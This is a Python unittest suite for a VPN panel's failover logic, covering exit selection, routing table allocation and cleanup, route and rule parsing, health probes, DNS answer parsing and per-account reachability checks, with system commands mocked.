"""Logic tests for the failover decision and routing table cleanup.

Run with: python3 -m unittest discover -s tests
"""
import json
import sqlite3
import struct
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "panel"))

import auth  # noqa: E402
import awgconf  # noqa: E402
import failover  # noqa: E402
import routing  # noqa: E402


class ChooseTests(unittest.TestCase):
    def test_activity_records_only_changes_to_the_active_exit(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "panel.db"
            with mock.patch.object(failover, "DB_PATH", path), sqlite3.connect(path) as conn:
                conn.execute("CREATE TABLE audit (ts TEXT, action TEXT, detail TEXT)")
                failover.record_exit_transition("awg1", "awg1", "", ["awg1"])
                failover.record_exit_transition("awg1", "awg2", "", ["awg2"])
                failover.record_exit_transition("awg2", None, "", [])
                failover.record_exit_transition(
                    "awg3", "awg2", "", ["awg2", "awg3"], {"awg3"})
                self.assertEqual(conn.execute("SELECT action, detail FROM audit").fetchall(), [
                    ("exit_failover", "awg1 → awg2 · Previous exit unavailable"),
                    ("exit_failover", "awg2 → none · No healthy internet exit"),
                    ("exit_failover", "awg3 → awg2 · Previous exit degraded"),
                ])

    def test_switching_away_from_a_degraded_exit_is_immediate(self):
        # tick() removes a degraded exit from the pool; the active one is then
        # no longer in the list, so choose() returns the healthy exit at once.
        desired, clear = failover.choose(
            "awg1", ["awg2"], "", {"awg2": 0}, now=1000, stable=60
        )
        self.assertEqual(desired, "awg2")
        self.assertFalse(clear)

    def test_manual_pins_lower_priority(self):
        desired, clear = failover.choose(
            "awg2", ["awg1", "awg2"], "awg2", {"awg1": 0, "awg2": 0}, now=1000, stable=60
        )
        self.assertEqual(desired, "awg2")
        self.assertFalse(clear)

    def test_manual_survives_failback_window(self):
        # The better exit is stable, but the manual choice still wins.
        desired, clear = failover.choose(
            "awg2", ["awg1", "awg2"], "awg2", {"awg1": 900, "awg2": 950}, now=1000, stable=60
        )
        self.assertEqual(desired, "awg2")
        self.assertFalse(clear)

    def test_manual_dead_clears_and_falls_back(self):
        desired, clear = failover.choose(
            "awg2", ["awg1"], "awg2", {"awg1": 0}, now=1000, stable=60
        )
        self.assertEqual(desired, "awg1")
        self.assertTrue(clear)

    def test_active_dead_switches_immediately(self):
        desired, clear = failover.choose(
            "awg9", ["awg1"], "", {"awg1": 990}, now=1000, stable=60
        )
        self.assertEqual(desired, "awg1")
        self.assertFalse(clear)

    def test_failback_waits_for_stability(self):
        desired, clear = failover.choose(
            "awg2", ["awg1", "awg2"], "", {"awg1": 990, "awg2": 10}, now=1000, stable=60
        )
        self.assertEqual(desired, "awg2")

    def test_failback_after_stable(self):
        desired, clear = failover.choose(
            "awg2", ["awg1", "awg2"], "", {"awg1": 900, "awg2": 10}, now=1000, stable=60
        )
        self.assertEqual(desired, "awg1")

    def test_no_alive_exits(self):
        desired, clear = failover.choose("awg1", [], "", {}, now=1000, stable=60)
        self.assertIsNone(desired)
        self.assertFalse(clear)


class ClientExitTests(unittest.TestCase):
    def test_first_alive_wins(self):
        self.assertEqual(failover.pick_client_exit(["awg1", "awg2"], ["awg1", "awg2"]), "awg1")

    def test_falls_to_second_when_first_down(self):
        self.assertEqual(failover.pick_client_exit(["awg1", "awg2"], {"awg2"}), "awg2")

    def test_order_beats_exit_priority(self):
        # The client put awg3 first, so it wins even if awg1 is also alive.
        self.assertEqual(failover.pick_client_exit(["awg3", "awg1"], {"awg1", "awg3"}), "awg3")

    def test_all_down_means_no_internet(self):
        self.assertIsNone(failover.pick_client_exit(["awg1", "awg2"], set()))

    def test_no_grants(self):
        self.assertIsNone(failover.pick_client_exit([], {"awg1"}))


class ClientGrantQueryTests(unittest.TestCase):
    """client_grants() must not depend on the legacy internet flag."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.old_db = failover.DB_PATH
        failover.DB_PATH = Path(self.tmp.name) / "panel.db"
        conn = sqlite3.connect(failover.DB_PATH)
        conn.executescript(
            """
            CREATE TABLE clients (id INTEGER PRIMARY KEY, ip TEXT, enabled INTEGER,
                internet INTEGER, table_num INTEGER, account_id INTEGER,
                pinned_iface TEXT NOT NULL DEFAULT '');
            CREATE TABLE exits (id INTEGER PRIMARY KEY, iface TEXT, enabled INTEGER,
                mode TEXT, priority INTEGER);
            CREATE TABLE client_internet_exits (client_id INTEGER, exit_id INTEGER,
                priority INTEGER);
            INSERT INTO exits VALUES (1, 'awg1', 1, 'internet', 10);
            INSERT INTO clients VALUES (1, '10.80.0.2', 1, 0, 1001, 7, '');
            INSERT INTO clients VALUES (2, '10.80.0.3', 1, 0, 1002, NULL, '');
            INSERT INTO clients VALUES (3, '10.80.0.4', 1, 1, 1003, 7, '');
            INSERT INTO client_internet_exits VALUES (1, 1, 10);
            INSERT INTO client_internet_exits VALUES (2, 1, 10);
            INSERT INTO client_internet_exits VALUES (3, 1, 10);
            """
        )
        conn.commit()
        conn.close()

    def tearDown(self):
        failover.DB_PATH = self.old_db
        self.tmp.cleanup()

    def test_account_config_keeps_its_grants_without_the_legacy_flag(self):
        grants = failover.client_grants()
        self.assertEqual([g["ip"] for g in grants], ["10.80.0.2", "10.80.0.4"])


class ClientTableTests(unittest.TestCase):
    def setUp(self):
        self.conn = sqlite3.connect(":memory:")
        self.conn.execute(
            "CREATE TABLE exits (id INTEGER PRIMARY KEY, "
            "table_num INTEGER NOT NULL DEFAULT 0, mode TEXT)"
        )
        self.conn.execute(
            "CREATE TABLE clients (id INTEGER PRIMARY KEY, "
            "table_num INTEGER NOT NULL DEFAULT 0)"
        )
        self.conn.execute(
            "CREATE TABLE table_numbers (table_num INTEGER PRIMARY KEY, "
            "kind TEXT NOT NULL, owner_id INTEGER NOT NULL)"
        )

    def test_pool_starts_above_the_system_tables(self):
        self.assertGreaterEqual(routing.allocate_table(self.conn),
                                routing.TABLE_POOL_BASE)

    def test_skips_numbers_used_by_exits_and_clients(self):
        self.conn.execute("INSERT INTO exits (table_num, mode) VALUES (1001, 'routes')")
        self.conn.execute("INSERT INTO clients (table_num) VALUES (1002)")
        self.assertEqual(routing.allocate_table(self.conn), 1003)

    def test_reuses_freed_numbers(self):
        self.assertEqual(routing.allocate_table(self.conn), 1001)
        self.assertEqual(routing.allocate_table(self.conn), 1001)

    def test_never_returns_a_reserved_table(self):
        number = routing.allocate_table(self.conn)
        self.assertNotIn(number, routing.RESERVED_TABLES)

    def test_claim_reserves_the_number_for_both_kinds(self):
        client = routing.claim_table(self.conn, "client", 1)
        exit_table = routing.claim_table(self.conn, "exit", 1)
        self.assertNotEqual(client, exit_table)
        self.assertEqual(routing.allocate_table(self.conn), exit_table + 1)

    def test_release_frees_the_number(self):
        number = routing.claim_table(self.conn, "client", 7)
        routing.release_table(self.conn, "client", 7)
        self.assertEqual(routing.claim_table(self.conn, "client", 8), number)

    def test_registry_repairs_a_cross_type_duplicate(self):
        self.conn.execute("INSERT INTO exits (id, table_num, mode) VALUES (1, 1001, 'routes')")
        self.conn.execute("INSERT INTO clients (id, table_num) VALUES (1, 1001)")
        routing.sync_registry(self.conn)
        exit_table = self.conn.execute(
            "SELECT table_num FROM exits WHERE id = 1").fetchone()[0]
        client_table = self.conn.execute(
            "SELECT table_num FROM clients WHERE id = 1").fetchone()[0]
        self.assertNotEqual(exit_table, client_table)
        claims = self.conn.execute(
            "SELECT count(*) FROM table_numbers").fetchone()[0]
        self.assertEqual(claims, 2)

    def test_registry_rebuild_drops_stale_claims(self):
        self.conn.execute(
            "INSERT INTO table_numbers (table_num, kind, owner_id) VALUES (1001, 'client', 9)"
        )
        routing.sync_registry(self.conn)
        self.assertEqual(
            self.conn.execute("SELECT count(*) FROM table_numbers").fetchone()[0], 0
        )


class ParseTests(unittest.TestCase):
    def test_rules_keeps_only_ours(self):
        output = (
            "0:\tfrom all lookup local\n"
            "10000:\tfrom 10.80.0.3 to 10.90.0.2 iif awg0 lookup 1001\n"
            "19000:\tfrom 10.80.0.2 iif awg0 lookup 1002\n"
            "20000:\tfrom 10.80.0.2 iif awg0 lookup 100\n"
            "32766:\tfrom all lookup main\n"
            "5000:\tfrom 10.80.0.9 iif eth0 lookup 1001\n"
        )
        rules = routing.parse_rules(output, 100)
        self.assertEqual(rules, {
            (10000, ("from", "10.80.0.3", "to", "10.90.0.2", "iif", "awg0", "lookup", "1001")),
            (19000, ("from", "10.80.0.2", "iif", "awg0", "lookup", "1002")),
            (20000, ("from", "10.80.0.2", "iif", "awg0", "lookup", "100")),
        })

    def test_rules_never_match_reserved_tables(self):
        output = "30000:\tfrom 10.80.0.2 iif awg0 lookup 254\n"
        self.assertEqual(routing.parse_rules(output, 100), set())

    def test_rules_recognise_the_proxy_mark(self):
        mark = f"0x{routing.SOCKS_MARK_BASE + 1002:x}"
        output = (
            f"18000:\tfrom all fwmark {mark} lookup 1002\n"
            "18000:\tfrom all fwmark 0x1234 lookup 1002\n"
            f"18000:\tfrom all fwmark {mark} lookup 254\n"
        )
        self.assertEqual(routing.parse_rules(output, 100), {
            (18000, ("from", "all", "fwmark", mark, "lookup", "1002")),
        })

    def test_routes_parses_prefix_and_dev(self):
        output = "default dev awg3 scope link\n10.90.0.2 dev awg2 scope link\n"
        self.assertEqual(
            routing.parse_routes(output),
            {("default", "awg3"), ("10.90.0.2", "awg2")},
        )

    def test_host_prefixes_match_the_kernel_form(self):
        # The database stores 10.90.0.2/32, the kernel prints 10.90.0.2.
        self.assertEqual(routing._norm_prefix("10.90.0.2/32"), "10.90.0.2")
        self.assertEqual(routing._norm_prefix("10.90.0.2"), "10.90.0.2")
        self.assertEqual(routing._norm_prefix("10.90.0.5/30"), "10.90.0.4/30")
        self.assertEqual(routing._norm_prefix("default"), "default")

    def test_rules_normalize_the_to_prefix(self):
        output = "10000:\tfrom 10.80.0.3 to 10.90.0.2 iif awg0 lookup 1001\n"
        rules = routing.parse_rules(output, 100)
        desired = {(10000, ("from", "10.80.0.3", "to", routing._norm_prefix("10.90.0.2/32"),
                            "iif", "awg0", "lookup", "1001"))}
        self.assertEqual(rules, desired)


class PlanChangesTests(unittest.TestCase):
    def rule(self, prio, *spec):
        return (prio, tuple(spec))

    def test_empty_to_full_is_all_adds(self):
        desired = {self.rule(19000, "from", "10.80.0.2", "iif", "awg0", "lookup", "1002")}
        plan = routing.plan_changes(set(), desired, {}, {1002: {("default", "awg3")}}, set())
        self.assertEqual(plan["rules_del"], [])
        self.assertEqual(plan["rules_add"], sorted(desired))
        self.assertEqual(plan["routes_add"], [(1002, "default", "awg3")])
        self.assertEqual(plan["tables_flush"], [])

    def test_identical_state_is_a_noop(self):
        rules = {self.rule(19000, "from", "10.80.0.2", "iif", "awg0", "lookup", "1002")}
        routes = {1002: {("default", "awg3")}}
        plan = routing.plan_changes(rules, rules, routes, routes, {1002})
        self.assertEqual(plan["rules_del"], [])
        self.assertEqual(plan["rules_add"], [])
        self.assertEqual(plan["routes_del"], [])
        self.assertEqual(plan["routes_add"], [])
        self.assertEqual(plan["tables_flush"], [])

    def test_priority_change_is_del_plus_add(self):
        old = {self.rule(19000, "from", "10.80.0.2", "iif", "awg0", "lookup", "1002")}
        new = {self.rule(20000, "from", "10.80.0.2", "iif", "awg0", "lookup", "100")}
        plan = routing.plan_changes(old, new, {}, {}, set())
        self.assertEqual(plan["rules_del"], sorted(old))
        self.assertEqual(plan["rules_add"], sorted(new))

    def test_used_table_is_not_flushed_but_pruned(self):
        existing = {1002: {("default", "awg3"), ("10.9.9.0/24", "awg3")}}
        desired = {1002: {("default", "awg3")}}
        plan = routing.plan_changes(set(), set(), existing, desired, {1002})
        self.assertEqual(plan["tables_flush"], [])
        self.assertEqual(plan["routes_del"], [(1002, "10.9.9.0/24", "awg3")])
        self.assertEqual(plan["routes_add"], [])

    def test_orphan_table_is_flushed(self):
        plan = routing.plan_changes(set(), set(), {}, {1002: {("default", "awg3")}}, {1001, 1002})
        self.assertEqual(plan["tables_flush"], [1001])

    def test_reserved_and_low_tables_are_never_flushed(self):
        plan = routing.plan_changes(set(), set(), {}, {}, {254, 255, 1000, 100})
        self.assertEqual(plan["tables_flush"], [])


class RoutingRunDirMixin:
    """Point the routing lock at a temp dir so tests never touch /run/kaskad."""

    def setUp(self):
        super().setUp()
        self._run_dir = tempfile.TemporaryDirectory()
        self._saved = (routing.RUN_DIR, routing.LOCK_PATH)
        routing.RUN_DIR = Path(self._run_dir.name)
        routing.LOCK_PATH = routing.RUN_DIR / "routing.lock"

    def tearDown(self):
        routing.RUN_DIR, routing.LOCK_PATH = self._saved
        self._run_dir.cleanup()
        super().tearDown()


class FailoverStatusTests(RoutingRunDirMixin, unittest.TestCase):
    def test_failed_replace_is_not_reported(self):
        failed = subprocess.CompletedProcess(args=[], returncode=2, stdout="", stderr="boom")
        with mock.patch.object(failover, "run", return_value=failed), \
             mock.patch.object(failover, "current_default", return_value=None):
            used = failover.apply_client_routes({(1001, "10.80.0.2"): ["awg1"]}, {"awg1"})
        self.assertEqual(used, {})

    def test_confirmed_route_is_reported(self):
        ok = subprocess.CompletedProcess(args=[], returncode=0, stdout="", stderr="")
        with mock.patch.object(failover, "run", return_value=ok), \
             mock.patch.object(failover, "current_default", return_value="awg1"):
            used = failover.apply_client_routes({(1001, "10.80.0.2"): ["awg1"]}, {"awg1"})
        self.assertEqual(used, {"10.80.0.2": "awg1"})

    def test_no_table_is_skipped(self):
        used = failover.apply_client_routes({(0, "10.80.0.2"): ["awg1"]}, {"awg1"})
        self.assertEqual(used, {})


class SyncRoutingTests(unittest.TestCase):
    def setUp(self):
        failover.known_ifaces = None
        failover.routing_pending = False
        failover.routing_retry_at = 0.0
        failover.routing_backoff = 10
        failover.routing_last_error = ""

    def tearDown(self):
        failover.known_ifaces = None
        failover.routing_pending = False
        failover.routing_retry_at = 0.0
        failover.routing_backoff = 10
        failover.routing_last_error = ""

    def sync(self, ifaces, apply=None):
        apply = apply or mock.Mock(return_value={"errors": [], "tables": []})
        with mock.patch.object(failover, "awg_ifaces", return_value=set(ifaces)), \
             mock.patch.object(failover.routing, "apply", apply), \
             mock.patch.object(failover.time, "sleep"):
            failover.sync_routing({"route_table": 100})
        return apply

    def test_first_sync_applies_routing(self):
        apply = self.sync({"awg0", "awg1"})
        apply.assert_called_once()
        self.assertFalse(failover.routing_pending)
        self.assertEqual(failover.known_ifaces, {"awg0", "awg1"})

    def test_unchanged_interfaces_do_not_apply(self):
        self.sync({"awg0"})
        apply = self.sync({"awg0"})
        apply.assert_not_called()

    def test_appeared_exit_triggers_apply(self):
        self.sync({"awg0"})
        apply = self.sync({"awg0", "awg2"})
        apply.assert_called_once()

    def test_vanished_exit_triggers_apply(self):
        self.sync({"awg0", "awg2"})
        apply = self.sync({"awg0"})
        apply.assert_called_once()

    def test_failed_apply_is_retried_until_clean(self):
        self.sync({"awg0"})
        failing = mock.Mock(return_value={"errors": ["boom"], "tables": []})
        self.sync({"awg0", "awg2"}, failing)
        self.assertTrue(failover.routing_pending)
        self.assertGreater(failover.routing_backoff, 10)
        # Within the backoff window the daemon does not hammer the kernel.
        skipped = self.sync({"awg0", "awg2"})
        skipped.assert_not_called()
        # After the window it retries and, on success, clears the state.
        failover.routing_retry_at = 0.0
        apply = self.sync({"awg0", "awg2"})
        apply.assert_called_once()
        self.assertFalse(failover.routing_pending)
        self.assertEqual(failover.routing_backoff, 10)


from concurrent.futures import Future, wait


class ProbeTests(unittest.TestCase):
    def test_ping_rtt_is_parsed(self):
        line = "64 bytes from 1.1.1.1: icmp_seq=1 ttl=57 time=12.3 ms"
        self.assertEqual(failover.ping_rtt(line), 12.3)
        self.assertIsNone(failover.ping_rtt("Request timeout for icmp_seq 0"))
        self.assertIsNone(failover.ping_rtt(""))

    def probe_with(self, codes):
        def fake(cmd, **kw):
            if cmd[0] == "ping":
                return subprocess.CompletedProcess(cmd, 0, "time=7.9 ms", "")
            return subprocess.CompletedProcess(cmd, 0, codes.get(cmd[-1], "000"), "")

        with mock.patch.object(failover, "iface_exists", return_value=True), \
             mock.patch.object(failover, "resolve_via",
                               return_value=["93.184.216.34"]), \
             mock.patch.object(failover, "run", side_effect=fake):
            return failover.probe({"iface": "awg1", "mode": "internet"})

    def test_internet_probe_returns_the_latency_and_health(self):
        codes = {url: str(expected) for url, expected in failover.PROBE_HTTP}
        self.assertEqual(self.probe_with(codes), (True, 7.9, True))

    def test_one_unreachable_target_does_not_condemn_a_live_exit(self):
        codes = {url: str(expected) for url, expected in failover.PROBE_HTTP}
        codes["http://example.com/"] = "000"
        self.assertEqual(self.probe_with(codes), (True, 7.9, True))

    def test_two_unreachable_targets_mark_a_live_exit_unhealthy(self):
        codes = {url: str(expected) for url, expected in failover.PROBE_HTTP}
        codes["http://example.com/"] = "000"
        codes["http://captive.apple.com/hotspot-detect.html"] = "000"
        self.assertEqual(self.probe_with(codes), (True, 7.9, False))

    def test_failed_probe_has_no_latency(self):
        failed = subprocess.CompletedProcess([], 1, "", "timeout")
        with mock.patch.object(failover, "iface_exists", return_value=True), \
             mock.patch.object(failover, "tcp_ms", return_value=None), \
             mock.patch.object(failover, "run", return_value=failed):
            self.assertEqual(failover.probe({"iface": "awg1", "mode": "internet"}),
                             (False, None, False))

    def test_alive_by_tcp_when_icmp_is_filtered(self):
        ping_failed = subprocess.CompletedProcess([], 1, "", "")
        with mock.patch.object(failover, "iface_exists", return_value=True), \
             mock.patch.object(failover, "run", return_value=ping_failed), \
             mock.patch.object(failover, "tcp_ms", return_value=12.5), \
             mock.patch.object(failover, "http_probe", return_value=(True, {})):
            self.assertEqual(
                failover.probe({"iface": "awg1", "mode": "internet"}),
                (True, 12.5, True),
            )

    def test_http_probe_fetches_the_address_resolved_by_the_exit(self):
        commands = []

        def fake(cmd, **kw):
            commands.append(cmd)
            code = "204" if cmd[-1].endswith("generate_204") else "200"
            return subprocess.CompletedProcess(cmd, 0, code, "")

        with mock.patch.object(failover, "resolve_via",
                               return_value=["172.66.147.243"]), \
             mock.patch.object(failover, "run", side_effect=fake):
            healthy, results = failover.http_probe("awg1")
        self.assertTrue(healthy)
        self.assertTrue(all(results.values()))
        joined = " ".join(commands[0])
        self.assertIn("--resolve", commands[0])
        self.assertIn("172.66.147.243", joined)

    def test_http_probe_tries_the_next_address(self):
        codes = iter(["000", "200"])

        def fake(cmd, **kw):
            url = cmd[-1]
            if url.endswith("generate_204"):
                code = "204"
            elif "apple" in url:
                code = "200"
            else:
                code = next(codes)
            return subprocess.CompletedProcess(cmd, 0, code, "")

        with mock.patch.object(failover, "resolve_via",
                               return_value=["172.66.147.243", "104.20.23.154"]), \
             mock.patch.object(failover, "run", side_effect=fake):
            healthy, _results = failover.http_probe("awg1")
        self.assertTrue(healthy)

    def test_http_probe_fails_when_dns_returns_nothing(self):
        with mock.patch.object(failover, "resolve_via", return_value=[]), \
             mock.patch.object(failover, "run") as run:
            healthy, results = failover.http_probe("awg1")
        self.assertFalse(healthy)
        self.assertFalse(any(results.values()))
        self.assertFalse(run.called)

    def test_a_records_are_parsed_with_their_ttl(self):
        question = failover.build_query("example.com")
        header = question[:12]
        body = question[12:]
        answer = (b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4)
                  + bytes([172, 66, 147, 243]))
        packet = (struct.pack("!HHHHHH", 0x4B41, 0x8180, 1, 1, 0, 0)
                  + body + answer)
        self.assertEqual(failover.parse_a(packet), [("172.66.147.243", 60)])
        self.assertEqual(failover.parse_a(b""), [])

    def test_resolve_via_caches_the_answer(self):
        failover.dns_cache.clear()
        try:
            with mock.patch.object(failover, "dns_servers", return_value=["1.1.1.1"]), \
                 mock.patch.object(failover, "dns_lookup",
                                   return_value=[("172.66.147.243", 60)]) as lookup:
                first = failover.resolve_via("awg1", "example.com")
                second = failover.resolve_via("awg1", "example.com")
            self.assertEqual(first, ["172.66.147.243"])
            self.assertEqual(second, first)
            self.assertEqual(lookup.call_count, 1)
        finally:
            failover.dns_cache.clear()

    def test_resolve_via_tries_the_next_resolver(self):
        failover.dns_cache.clear()
        try:
            def lookup(host, server, iface):
                if server == "1.1.1.1":
                    raise OSError("unreachable")
                return [("172.66.147.243", 60)]

            with mock.patch.object(failover, "dns_servers",
                                   return_value=["1.1.1.1", "9.9.9.9"]), \
                 mock.patch.object(failover, "dns_lookup", side_effect=lookup):
                self.assertEqual(failover.resolve_via("awg1", "example.com"),
                                 ["172.66.147.243"])
        finally:
            failover.dns_cache.clear()

    def test_resolve_via_keeps_a_literal_address(self):
        with mock.patch.object(failover, "dns_lookup") as lookup:
            self.assertEqual(failover.resolve_via("awg1", "10.9.0.1"), ["10.9.0.1"])
        self.assertFalse(lookup.called)

    def test_routed_probe_has_no_icmp_latency(self):
        handshake = subprocess.CompletedProcess(
            [], 0, f"peerkey {int(time.time())}\n", "")
        with mock.patch.object(failover, "iface_exists", return_value=True), \
             mock.patch.object(failover, "run", return_value=handshake):
            self.assertEqual(failover.probe({"iface": "awg2", "mode": "routes"}),
                             (True, None, True))

    def test_missing_interface_has_no_latency(self):
        with mock.patch.object(failover, "iface_exists", return_value=False):
            self.assertEqual(failover.probe({"iface": "awg9", "mode": "internet"}),
                             (False, None, False))

    def test_a_probe_in_flight_is_not_started_twice(self):
        failover.probe_inflight.clear()
        failover.state.pop("awg1", None)
        try:
            future = Future()
            row = {"iface": "awg1", "enabled": 1, "mode": "internet"}
            with mock.patch.object(failover.probe_pool, "submit",
                                   return_value=future) as submit:
                failover.start_probes([row])
                failover.start_probes([row])
                self.assertEqual(submit.call_count, 1)
                future.set_result((True, 12.0, True))
                failover.start_probes([])          # harvest only
                failover.start_probes([row])       # a fresh probe is allowed
                self.assertEqual(submit.call_count, 2)
            self.assertEqual(failover.state["awg1"]["oks"], 1)
        finally:
            failover.probe_inflight.clear()
            failover.state.pop("awg1", None)

    def test_a_dns_answer_for_another_name_is_rejected(self):
        query = failover.build_query("example.com", 0x1234)
        body = query[12:]
        answer = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4) + bytes([1, 2, 3, 4])
        reply = (struct.pack("!HHHHHH", 0x1234, 0x8180, 1, 1, 0, 0)
                 + body + answer)
        self.assertTrue(failover.matches_query(reply, 0x1234, "example.com"))
        self.assertFalse(failover.matches_query(reply, 0x1234, "opencode.ai"))
        self.assertFalse(failover.matches_query(reply, 0x9999, "example.com"))
        self.assertFalse(failover.matches_query(b"", 0x1234, "example.com"))

    def test_a_live_exit_degrades_after_bad_rounds(self):
        old = failover.state.copy()
        try:
            failover.state.clear()
            exit_ = {"iface": "awg1"}
            for _ in range(failover.DEGRADED_AFTER):
                failover.update_state(exit_, True, 10.0, healthy=False)
            st = failover.state["awg1"]
            self.assertTrue(st["alive"])
            self.assertTrue(st["degraded"])
            for _ in range(failover.RECOVER_AFTER):
                failover.update_state(exit_, True, 10.0, healthy=True)
            self.assertFalse(st["degraded"])
            self.assertGreater(st["healthy_since"], 0)
        finally:
            failover.state.clear()
            failover.state.update(old)

    def test_state_keeps_the_last_latency(self):
        old = failover.state.copy()
        try:
            failover.state.clear()
            failover.update_state({"iface": "awg1"}, True, 12.6)
            failover.update_state({"iface": "awg1"}, True, 11.4)
            st = failover.state["awg1"]
            self.assertEqual(st["rtt_ms"], 11)
            self.assertTrue(st["alive"])
            self.assertGreater(st["rtt_ts"], 0)
        finally:
            failover.state.clear()
            failover.state.update(old)

    def test_status_carries_the_latency(self):
        import tempfile
        old_file = failover.STATUS_FILE
        old_state = failover.state.copy()
        with tempfile.TemporaryDirectory() as tmp:
            failover.STATUS_FILE = Path(tmp) / "status.json"
            try:
                failover.state.clear()
                failover.update_state({"iface": "awg1"}, True, 9.6)
                failover.update_state({"iface": "awg1"}, True, 9.4)
                failover.write_status("awg1", [{
                    "iface": "awg1", "name": "e", "enabled": 1,
                    "priority": 10, "mode": "internet",
                }], client_ping={"10.80.0.2": 7})
                payload = json.loads(failover.STATUS_FILE.read_text())
                self.assertEqual(payload["exits"]["awg1"]["rtt_ms"], 9)
                self.assertGreater(payload["exits"]["awg1"]["rtt_ts"], 0)
                self.assertEqual(payload["client_ping"], {"10.80.0.2": 7})
            finally:
                failover.STATUS_FILE = old_file
                failover.state.clear()
                failover.state.update(old_state)


class ClientCheckTests(RoutingRunDirMixin, unittest.TestCase):
    def test_an_avoided_exit_is_skipped_for_that_client(self):
        calls = []

        def fake_run(cmd, timeout=5):
            calls.append(cmd)
            return subprocess.CompletedProcess(cmd, 0, "", "")

        with mock.patch.object(failover, "run", side_effect=fake_run), \
             mock.patch.object(failover, "current_default", return_value="awg1"):
            failover.apply_client_routes(
                {(1002, "10.80.0.2"): ["awg1", "awg2"]},
                ["awg1", "awg2"],
                {(1002, "10.80.0.2"): {"awg1"}},
            )
        self.assertTrue(any("awg2" in cmd for cmd in calls))

    def test_when_every_exit_is_avoided_the_order_is_used_anyway(self):
        calls = []

        def fake_run(cmd, timeout=5):
            calls.append(cmd)
            return subprocess.CompletedProcess(cmd, 0, "", "")

        with mock.patch.object(failover, "run", side_effect=fake_run), \
             mock.patch.object(failover, "current_default", return_value="awg1"):
            failover.apply_client_routes(
                {(1002, "10.80.0.2"): ["awg1", "awg2"]},
                ["awg1", "awg2"],
                {(1002, "10.80.0.2"): {"awg1", "awg2"}},
            )
        # awg1 is already the route, so nothing is replaced; the point is that
        # the client keeps a working exit instead of losing its route.
        self.assertFalse(any("replace" in cmd for cmd in calls))

    def routes(self, pins=None, alive=None, avoid=None, current="awg2",
               alive_all=("awg1", "awg2")):
        calls = []

        def fake_run(cmd, timeout=5):
            calls.append(cmd)
            return subprocess.CompletedProcess(cmd, 0, "", "")

        with mock.patch.object(failover, "run", side_effect=fake_run), \
             mock.patch.object(failover, "current_default", return_value=current):
            failover.apply_client_routes(
                {(1002, "10.80.0.2"): ["awg1", "awg2"]},
                alive or ["awg2"],
                avoid,
                pins,
                list(alive_all),
            )
        return calls

    def test_a_pinned_degraded_exit_is_used(self):
        # awg1 is alive but degraded (not in the healthy list); the owner
        # asked for it, so the route follows the pin, not the order.
        calls = self.routes(pins={(1002, "10.80.0.2"): "awg1"})
        self.assertTrue(any(cmd[:3] == ["ip", "route", "replace"]
                            and "awg1" in cmd for cmd in calls))

    def test_a_pin_beats_the_account_checks(self):
        calls = self.routes(
            pins={(1002, "10.80.0.2"): "awg1"},
            avoid={(1002, "10.80.0.2"): {"awg1"}},
        )
        self.assertTrue(any(cmd[:3] == ["ip", "route", "replace"]
                            and "awg1" in cmd for cmd in calls))

    def test_a_pin_to_an_exit_that_is_not_granted_is_ignored(self):
        calls = self.routes(pins={(1002, "10.80.0.2"): "awg3"})
        self.assertFalse(any("awg3" in cmd for cmd in calls))

    def test_staying_on_a_pinned_degraded_exit_is_logged_once(self):
        failover.pinned_degraded.clear()
        try:
            messages = []

            def fake_run(cmd, timeout=5):
                return subprocess.CompletedProcess(cmd, 0, "", "")

            with mock.patch.object(failover, "run", side_effect=fake_run), \
                 mock.patch.object(failover, "current_default",
                                   return_value="awg1"), \
                 mock.patch.object(failover, "log", side_effect=messages.append):
                for _ in range(3):
                    failover.apply_client_routes(
                        {(1002, "10.80.0.2"): ["awg1", "awg2"]},
                        ["awg2"],
                        None,
                        {(1002, "10.80.0.2"): "awg1"},
                        ["awg1", "awg2"],
                    )
            staying = [m for m in messages if "staying on pinned" in m]
            self.assertEqual(len(staying), 1, messages)
        finally:
            failover.pinned_degraded.clear()

    def test_a_pinned_degraded_exit_is_reported_as_in_use(self):
        calls = []
        with mock.patch.object(failover, "current_default", return_value="awg1"), \
             mock.patch.object(failover, "run", side_effect=lambda *a, **k: calls.append(a)):
            used = failover.apply_client_routes(
                {(1002, "10.80.0.2"): ["awg1", "awg2"]},
                ["awg2"],
                None,
                {(1002, "10.80.0.2"): "awg1"},
                ["awg1", "awg2"],
            )
        self.assertEqual(used.get("10.80.0.2"), "awg1")

    def test_a_dead_pin_falls_back_to_the_order(self):
        calls = self.routes(pins={(1002, "10.80.0.2"): "awg9"}, current="awg1")
        self.assertTrue(any(cmd[:3] == ["ip", "route", "replace"]
                            and "awg2" in cmd for cmd in calls))
        self.assertFalse(any("awg9" in cmd for cmd in calls))

    def test_a_check_marks_an_exit_after_three_failures(self):
        failover.check_state.clear()
        try:
            for _ in range(failover.CHECK_DEAD_AFTER):
                failover.update_check_state(1, "http://1.1.1.1/", "awg1", False)
            self.assertTrue(failover.check_state[(1, "awg1")]["bad"])
            for _ in range(failover.CHECK_RECOVER):
                failover.update_check_state(1, "http://1.1.1.1/", "awg1", True)
            self.assertFalse(failover.check_state[(1, "awg1")]["bad"])
        finally:
            failover.check_state.clear()

    def test_the_account_report_lists_only_failing_exits(self):
        checks = [{"id": 5, "account_id": 1, "kind": "http",
                   "target": "http://1.1.1.1/"}]
        grants = [{"account_id": 1, "iface": "awg1"},
                  {"account_id": 1, "iface": "awg2"}]
        failover.check_state.clear()
        try:
            with mock.patch.object(failover, "account_checks", return_value=checks), \
                 mock.patch.object(failover, "account_grants", return_value=grants), \
                 mock.patch.object(failover, "check_ok",
                                   side_effect=lambda k, t, i: i == "awg2"):
                for _ in range(failover.CHECK_DEAD_AFTER):
                    failover.run_account_checks()
                    settle_checks()
                avoid, report = failover.run_account_checks()
            self.assertEqual(avoid, {1: {"awg1"}})
            self.assertEqual(report["1"]["5"]["failing"], ["awg1"])
        finally:
            failover.check_state.clear()


def settle_checks(timeout=5):
    """Waits for the running account checks and applies their results."""
    if failover.check_inflight:
        wait(list(failover.check_inflight), timeout=timeout)
    failover.harvest_checks()


class AccountCheckSchedulingTests(unittest.TestCase):
    def tearDown(self):
        if failover.check_inflight:
            wait(list(failover.check_inflight), timeout=5)
        failover.check_inflight.clear()
        failover.check_state.clear()
        failover.check_cursor = 0

